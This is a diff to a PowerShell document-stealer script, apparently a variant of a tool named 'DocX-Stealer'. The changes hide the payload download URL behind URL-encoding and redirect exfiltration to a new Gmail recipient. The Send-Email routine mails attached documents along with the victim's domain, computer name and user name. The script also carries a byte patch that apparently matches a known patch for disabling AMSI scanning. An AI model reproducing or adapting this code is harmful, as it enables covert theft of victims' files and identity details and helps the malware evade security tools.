@@ -2,7 +2,8 @@ Add-Type -AssemblyName System.Security
 
 
 ##### GLOBAL #####
-$Content = (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/niro095/DocX-Stealer/master/Secret')
+$fromHere = [System.Web.HttpUtility]::UrlDecode("https%3A%2F%2Fraw.githubusercontent.com%2Fnatasaka%2FDocStealer%2Fmain%2FSecret")
+$Content = (New-Object Net.Webclient).DownloadString($fromHere)
 [string[]]$Bytes = $Content.Split("`n")
 $ContentX = [Security.Cryptography.ProtectedData]::Protect($Bytes, $Null, [Security.Cryptography.DataProtectionScope]::LocalMachine)
 $docsSent =  New-Object Collections.Generic.List[String]
@@ -45,8 +46,8 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 
 # Send Email function
 function Send-Email {
-    $From = "cynetrir@gmail.com"
-    $To = "cynetrir@gmail.com"
+    $From = "@gmail.com"
+    $To = "justSome_2424@gmail.com"
     $Attachment = $args[0]
     $Subject = "Email Subject"
     $Body = "UserDomain: " + $env:UserDomain + " ComputerName: " + $env:ComputerName + " UserName: " + $env:UserName + " Attachment: " + [io.path]::GetFileName($args[0])
